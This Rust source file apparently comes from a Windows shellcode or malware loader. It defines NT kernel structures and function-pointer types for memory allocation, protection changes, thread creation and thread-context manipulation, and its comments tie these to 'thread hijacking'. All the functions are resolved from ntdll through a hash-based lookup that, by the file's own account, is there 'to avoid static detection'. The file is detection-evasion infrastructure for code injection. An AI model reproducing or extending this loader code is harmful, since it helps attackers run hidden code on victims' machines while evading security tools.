//loader/src/native/call.rs

use std::ffi::c_void;
use std::mem;

use crate::native::peb_parsing_by_hash::{find_function_by_hash, simple_hash, find_ntdll_simple};


// === Memory allocation constants for use with NtAllocateVirtualMemory ===
pub const MEM_COMMIT: u32 = 0x00001000;
pub const MEM_RESERVE: u32 = 0x00002000;
pub const PAGE_READWRITE: u32 = 0x04;
pub const PAGE_EXECUTE_READWRITE: u32 = 0x40;
pub const MEM_RELEASE: u32 = 0x8000;

// === Context flags for NtGetContextThread / NtSetContextThread ===
pub const CONTEXT_FULL: u32 = 0x00010007;

// === File access flags ===
pub const OBJ_CASE_INSENSITIVE: u32 = 0x00000040;
pub const FILE_READ_ATTRIBUTES: u32 = 0x0080;
pub const FILE_SHARE_READ: u32 = 0x00000001;
pub const FILE_OPEN: u32 = 0x00000001;
pub const FILE_NON_DIRECTORY_FILE: u32 = 0x00000040;
pub const FILE_SYNCHRONOUS_IO_NONALERT: u32 = 0x00000020;

pub const FileStandardInformation: u32 = 5;

// === Required NT kernel-level structures ===
#[repr(C)]
pub struct IO_STATUS_BLOCK {
    pub Status: i32,
    pub Information: usize,
}

#[repr(C)]
pub struct UNICODE_STRING {
    pub Length: u16,
    pub MaximumLength: u16,
    pub Buffer: *mut u16,
}

#[repr(C)]
pub struct FILE_STANDARD_INFORMATION {
    pub AllocationSize: i64,
    pub EndOfFile: i64,
    pub NumberOfLinks: u32,
    pub DeletePending: u8,
    pub Directory: u8,
    pub _reserved: [u8; 2],
}

#[repr(C)]
pub struct OBJECT_ATTRIBUTES {
    pub Length: u32,
    pub RootDirectory: *mut c_void,
    pub ObjectName: *mut UNICODE_STRING,
    pub Attributes: u32,
    pub SecurityDescriptor: *mut c_void,
    pub SecurityQualityOfService: *mut c_void,
}

// === CONTEXT structure for x64 threads (used in thread hijacking) ===
#[repr(C)]
#[derive(Debug, Clone, Copy)]
pub struct M128A {
    pub Low: u64,
    pub High: i64,
}


#[repr(C)]
#[derive(Debug, Clone, Copy)]
pub struct CONTEXT {
    pub P1Home: u64,
    pub P2Home: u64,
    pub P3Home: u64,
    pub P4Home: u64,
    pub P5Home: u64,
    pub P6Home: u64,
    pub ContextFlags: u32,
    pub MxCsr: u32,
    pub SegCs: u16,
    pub SegDs: u16,
    pub SegEs: u16,
    pub SegFs: u16,
    pub SegGs: u16,
    pub SegSs: u16,
    pub EFlags: u32,
    pub Dr0: u64,
    pub Dr1: u64,
    pub Dr2: u64,
    pub Dr3: u64,
    pub Dr6: u64,
    pub Dr7: u64,
    pub Rax: u64,
    pub Rcx: u64,
    pub Rdx: u64,
    pub Rbx: u64,
    pub Rsp: u64,
    pub Rbp: u64,
    pub Rsi: u64,
    pub Rdi: u64,
    pub R8: u64,
    pub R9: u64,
    pub R10: u64,
    pub R11: u64,
    pub R12: u64,
    pub R13: u64,
    pub R14: u64,
    pub R15: u64,
    pub Rip: u64,
    pub FltSave: [u8; 512], // XMM_SAVE_AREA32 - taille variable, 512 pour safe
    pub VectorRegister: [M128A; 26],
    pub VectorControl: u64,
    pub DebugControl: u64,
    pub LastBranchToRip: u64,
    pub LastBranchFromRip: u64,
    pub LastExceptionToRip: u64,
    pub LastExceptionFromRip: u64,
}

// === Type aliases for dynamically resolved NTAPI function pointers ===

pub type NtCreateThreadExFn = unsafe extern "system" fn(
    ThreadHandle: *mut *mut c_void,
    DesiredAccess: u32,
    ObjectAttributes: *mut c_void,
    ProcessHandle: *mut c_void,
    StartRoutine: *mut c_void,
    Argument: *mut c_void,
    CreateFlags: u32,
    ZeroBits: usize,
    StackSize: usize,
    MaximumStackSize: usize,
    AttributeList: *mut c_void,
) -> i32;

pub type NtGetContextThreadFn = unsafe extern "system" fn(
    ThreadHandle: *mut c_void,
    Context: *mut CONTEXT,
) -> i32;

pub type NtSetContextThreadFn = unsafe extern "system" fn(
    ThreadHandle: *mut c_void,
    Context: *const CONTEXT,
) -> i32;

pub type NtDelayExecutionFn = unsafe extern "system" fn(
    Alertable: u8,
    DelayInterval: *const i64,
) -> i32;

pub type NtFreeVirtualMemoryFn = unsafe extern "system" fn(
    ProcessHandle: *mut c_void,
    BaseAddress: *mut *mut c_void,
    RegionSize: *mut usize,
    FreeType: u32,
) -> i32;


pub type NtAllocateVirtualMemoryFn = unsafe extern "system" fn(
    ProcessHandle: *mut c_void,
    BaseAddress: *mut *mut c_void,
    ZeroBits: usize,
    RegionSize: *mut usize,
    AllocationType: u32,
    Protect: u32,
) -> i32;

pub type NtProtectVirtualMemoryFn = unsafe extern "system" fn(
    ProcessHandle: *mut c_void,
    BaseAddress: *mut *mut c_void,
    RegionSize: *mut usize,
    NewProtect: u32,
    OldProtect: *mut u32,
) -> i32;

pub type RtlCreateUserThreadFn = unsafe extern "system" fn(
    ProcessHandle: *mut c_void,
    SecurityDescriptor: *mut c_void,
    CreateSuspended: u8,
    StackZeroBits: u32,
    StackReserve: *mut usize,
    StackCommit: *mut usize,
    StartAddress: *mut c_void,
    StartParameter: *mut c_void,
    ThreadHandle: *mut *mut c_void,
    ClientId: *mut c_void,
) -> i32;

pub type NtWaitForSingleObjectFn = unsafe extern "system" fn(
    Handle: *mut c_void,
    Alertable: u8,
    Timeout: *mut c_void,
) -> i32;

pub type NtCloseFn = unsafe extern "system" fn(
    Handle: *mut c_void,
) -> i32;

pub type NtResumeThreadFn = unsafe extern "system" fn(
    ThreadHandle: *mut c_void,
    SuspendCount: *mut u32,
) -> i32;

pub type NtSuspendThreadFn = unsafe extern "system" fn(
    ThreadHandle: *mut c_void,
    SuspendCount: *mut u32,
) -> i32;

pub type NtOpenFileFn = unsafe extern "system" fn(
    FileHandle: *mut *mut c_void,
    DesiredAccess: u32,
    ObjectAttributes: *mut OBJECT_ATTRIBUTES,
    IoStatusBlock: *mut IO_STATUS_BLOCK,
    ShareAccess: u32,
    OpenOptions: u32,
) -> i32;

pub type NtQueryInformationFileFn = unsafe extern "system" fn(
    FileHandle: *mut c_void,
    IoStatusBlock: *mut IO_STATUS_BLOCK,
    FileInformation: *mut c_void,
    Length: u32,
    FileInformationClass: u32,
) -> i32;


// === Resolver functions for each NTAPI symbol ===
// These use hashed lookup (not IAT) to avoid static detection


pub fn get_nt_allocate_virtual_memory() -> Option<NtAllocateVirtualMemoryFn> {
    get_function("NtAllocateVirtualMemory")
}

pub fn get_nt_protect_virtual_memory() -> Option<NtProtectVirtualMemoryFn> {
    get_function("NtProtectVirtualMemory")
}

pub fn get_rtl_create_user_thread() -> Option<RtlCreateUserThreadFn> {
    get_function("RtlCreateUserThread")
}

pub fn get_nt_wait_for_single_object() -> Option<NtWaitForSingleObjectFn> {
    get_function("NtWaitForSingleObject")
}

pub fn get_nt_close() -> Option<NtCloseFn> {
    get_function("NtClose")
}

pub fn get_nt_create_thread_ex() -> Option<NtCreateThreadExFn> {
    get_function("NtCreateThreadEx")
}

pub fn get_nt_get_context_thread() -> Option<NtGetContextThreadFn> {
    get_function("NtGetContextThread")
}

pub fn get_nt_set_context_thread() -> Option<NtSetContextThreadFn> {
    get_function("NtSetContextThread")
}

pub fn get_nt_delay_execution() -> Option<NtDelayExecutionFn> {
    get_function("NtDelayExecution")
}

pub fn get_nt_free_virtual_memory() -> Option<NtFreeVirtualMemoryFn> {
    get_function("NtFreeVirtualMemory")
}

pub fn get_nt_resume_thread() -> Option<NtResumeThreadFn> {
    get_function("NtResumeThread")
}

pub fn get_nt_suspend_thread() -> Option<NtSuspendThreadFn> {
    get_function("NtSuspendThread")
}

pub fn get_nt_open_file() -> Option<NtOpenFileFn> {
    get_function("NtOpenFile")
}

pub fn get_nt_query_information_file() -> Option<NtQueryInformationFileFn> {
    get_function("NtQueryInformationFile")
}


// === Dynamic NTAPI structure ===
// Represents a fully initialized table of function pointers to NT native routines
pub struct NativeAPI {
    pub nt_allocate_virtual_memory: NtAllocateVirtualMemoryFn,
    pub nt_protect_virtual_memory: NtProtectVirtualMemoryFn,
    pub rtl_create_user_thread: RtlCreateUserThreadFn,
    pub nt_wait_for_single_object: NtWaitForSingleObjectFn,
    pub nt_close: NtCloseFn,
    pub nt_free_virtual_memory: NtFreeVirtualMemoryFn,
    pub nt_get_context_thread: NtGetContextThreadFn,
    pub nt_set_context_thread: NtSetContextThreadFn,
    pub nt_delay_execution: NtDelayExecutionFn,
    pub nt_create_thread_ex: NtCreateThreadExFn,
    pub nt_resume_thread: NtResumeThreadFn,
    pub nt_suspend_thread: NtSuspendThreadFn,
    pub nt_open_file: NtOpenFileFn,
    pub nt_query_information_file: NtQueryInformationFileFn,
}


impl NativeAPI {
    /// Dynamically resolves and loads all necessary NTAPI functions
    /// into a NativeAPI struct instance. Returns an error if any call fails.
    pub fn new() -> Result<Self, String> {
        
        let nt_allocate = get_nt_allocate_virtual_memory()
            .ok_or("Failed to resolve NtAllocateVirtualMemory".to_string())?;
        
        let nt_protect = get_nt_protect_virtual_memory()
            .ok_or("Failed to resolve NtProtectVirtualMemory".to_string())?;
        
        let rtl_create_thread = get_rtl_create_user_thread()
            .ok_or("Failed to resolve RtlCreateUserThread".to_string())?;
    
        let nt_wait = get_nt_wait_for_single_object()
            .ok_or("Failed to resolve NtWaitForSingleObject".to_string())?;
        
        let nt_close = get_nt_close()
            .ok_or("Failed to resolve NtClose".to_string())?;

        let nt_free = get_nt_free_virtual_memory()
            .ok_or("Failed to resolve NtFreeVirtualMemory".to_string())?;

        let nt_get_context = get_nt_get_context_thread()
            .ok_or("Failed to resolve NtGetContextThread".to_string())?;

        let nt_set_context = get_nt_set_context_thread()
            .ok_or("Failed to resolve NtSetContextThread".to_string())?;

        let nt_delay = get_nt_delay_execution()
            .ok_or("Failed to resolve NtDelayExecution".to_string())?;

        let nt_create_thread_ex = get_nt_create_thread_ex()
            .ok_or("Failed to resolve NtCreateThreadEx".to_string())?;

        let nt_resume = get_nt_resume_thread()
            .ok_or("Failed to resolve NtResumeThread".to_string())?;

        let nt_suspend = get_nt_suspend_thread()
            .ok_or("Failed to resolve NtSuspendThread".to_string())?;

        let nt_open_file = get_nt_open_file()
            .ok_or("Failed to resolve NtOpenFile".to_string())?;
            
        let nt_query_info_file = get_nt_query_information_file()
            .ok_or("Failed to resolve NtQueryInformationFile".to_string())?;    

        
        Ok(Self {
            nt_allocate_virtual_memory: nt_allocate,
            nt_protect_virtual_memory: nt_protect,
            rtl_create_user_thread: rtl_create_thread,
            nt_wait_for_single_object: nt_wait,
            nt_close: nt_close,
            nt_free_virtual_memory: nt_free,
            nt_get_context_thread: nt_get_context,
            nt_set_context_thread: nt_set_context,
            nt_delay_execution: nt_delay,
            nt_create_thread_ex: nt_create_thread_ex,
            nt_resume_thread: nt_resume,
            nt_suspend_thread: nt_suspend,
            nt_open_file: nt_open_file,
            nt_query_information_file: nt_query_info_file,
        })
    }
}



/// Generic function to resolve a function from ntdll.dll using a custom hash-based parser.
///
/// This avoids importing symbols statically, and supports full API resolution
/// from memory-mapped `ntdll.dll` based on `find_function_by_hash()`
pub fn get_function<T>(function_name: &str) -> Option<T> {
    let hash_func: u32 = simple_hash(function_name);

    unsafe {
        let ntdll_base = find_ntdll_simple()?;
        let func_addr = find_function_by_hash(ntdll_base, hash_func)?;
        Some(mem::transmute_copy(&func_addr))
    }
}